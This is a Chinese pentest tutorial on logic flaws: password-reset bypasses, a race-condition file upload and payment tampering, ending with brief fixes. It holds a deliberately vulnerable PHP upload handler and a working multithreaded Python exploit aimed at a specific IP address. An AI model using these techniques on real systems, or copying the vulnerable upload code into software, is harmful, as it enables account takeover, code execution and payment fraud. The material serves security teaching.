---
draft: false
date: 2016-07-31 18:43:49
title: 逻辑漏洞
description: 
categories:
  - Pentest
tags:
  - 逻辑漏洞
---

### 0x00 逻辑漏洞
逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。
这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。

### 0x01 密码找回漏洞
* 测试流程
    * 先尝试正确的密码找回流程，记录不同找回方式的所有数据包
    * 分析数据包，找到有效数据部分
    * 推测数据构造方法
    * 构造数据包验证猜测

* 分类
    * 邮箱找回
    ```
    一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接：
    http://domain/findpwd.php?u=xiaoming&token=MTIzQHFxLmNvbQ==
    http://domain/findpwd.php?id=374&token=2ad64bf14c714dbce88c7993663da7da
    当构造相应链接时就可以重置任意用户的密码
    ```

    * 手机短信找回
    ```
    短信找回一般就是4位或6位验证码，暴力猜测吧
    ```

    * 找回逻辑错误
    ```
    若恶意用户A用15123333333找回密码，此时收到验证码但不使用
    此时恶意用户A再用受害者B的手机号找回密码
    用户A在B的验证表单填入自己收到的验证码，发送
    此时跳转的修改密码页面修改的就是用户B的密码
    ```

    * 直接修改密码
    ```
    在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改
    ```
    
    * 本地验证
    ```
    随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段，
    若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可
    ```

    * 服务端将验证码返回给浏览器
    ```
    在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可
    ```

    * 验证码直接出现在url中
    ```
    当点击获取验证码时发出的请求链接中直接有code
    ```
    
    * 密保问题找回
    ```
    回答密保问题，有时一些答案就在html源码里
    ```

### 0x02 多线程条件竞争漏洞
多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的，若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。

* 文件上传

服务端可以sudo apt-get install inotify-tools安装监听文件的软件，执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化
```php
//uploads.php代码如下，仅供测试：
<meta charset='utf-8'>
<?php
    $allowtype = array("gif","png","jpg");
    $size = 10000000;
    $path = "./uploads/";

    $filename = $_FILES['myfile']['name'];

    if (is_uploaded_file($_FILES['myfile']['tmp_name'])){
        if (!move_uploaded_file($_FILES['myfile']['tmp_name'],$path.$filename)){
            die("error:can not move!");
        }
    } else {
        die("error:not an upload file！");
    }

    echo "file upload success.file path is: ".$path.$newfile."\n<br />";

    if ($_FILES['myfile']['error']>0){
        unlink($path.$newfile);
        die("Upload file error: ");
    }

    $ext = array_pop(explode(".",$_FILES['myfile']['name']));
    if (!in_array($ext,$allowtype)){
        unlink($path.$newfile);
        die("error:upload the file type is not allowed，delete the file！");
    }
?>
```

* 简单利用代码如下：

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests
import threading
import time

"""
200个线程上传文件aa.php，同时200个线程同时请求aa.php，aa.php中内容为
<?php fputs(fopen("info.php","w"),"<?php phpinfo(); ?>") ?>，
只要aa.php被请求成功就会生成内容为<?php phpinfo(); ?>的php文件info.php
"""

is_exit = False

def create_info():
    global is_exit
    while not is_exit:
        url = "http://123.206.78.220/uploads/aa.php"
        resp = requests.get(url)

def put_file():
    global is_exit
    file = {'myfile':('aa.php',open('C:/Users/Administrator/Desktop/aa.php'),'application/octet-stream')}
    upload_url = "http://123.206.78.220/uploads.php"
    while  not is_exit:
        requests.post(upload_url,files=file)

def check_info():
    global is_exit
    print "start threading check info.php:"
    url = "http://123.206.78.220/uploads/info.php"
    while True:
        print "check info.php..."
        resp = requests.get(url)
        if resp.status_code == 200:
            is_exit = True
            print "create file info.php success."
            break

for x in xrange(1,200):
    t = threading.Thread(target=create_info)
    t.setDaemon(True)
    t.start()
    print "start create_into threading %d" % x

for x in xrange(1,200):
    t = threading.Thread(target=put_file)
    t.setDaemon(True)
    t.start()
    print "start put_file threading %d" % x


t = threading.Thread(target=check_info)
t.setDaemon(True)
t.start()
try:
    while t.isAlive():
        pass
    time.sleep(1)
except KeyboardInterrupt:
    print 'stopped by keyboard'
 ```

* 数据库操作

在数据库进行update、delete等操作时使用多线程请求，可在一次update时间内完成多次update，和上面的文件上传其实是一个原理

### 0x03 支付漏洞
```
攻击者通过修改交易金额、交易数量等从而利用漏洞，
如Burp修改交易金额、使交易数量为负数或无限大等。

* 在支付时直接修改数据包中的支付金额，实现小金额购买大金额商品
* 修改购买数量，使之为负数，可购买负数量商品，从而扣除负积分，即增加积分，
  或使购买数量无限大，无限大时则程序可能处理出错，从而实现0金额支付
* 请求重放，在购买成功后重放请求，可实现"一次购买对此收货"
```

### 0x04 漏洞修复
* 对于密码重置漏洞，可以使用复杂的token，使之不可被预测
* 对于密码重置漏洞，校验refer，不使用本地校验等
* 对于多线程竞争漏洞，文件移动一定在一切判断之后，对于数据库则可以设置锁
* 对于支付漏洞，主要就是签名了，或者https
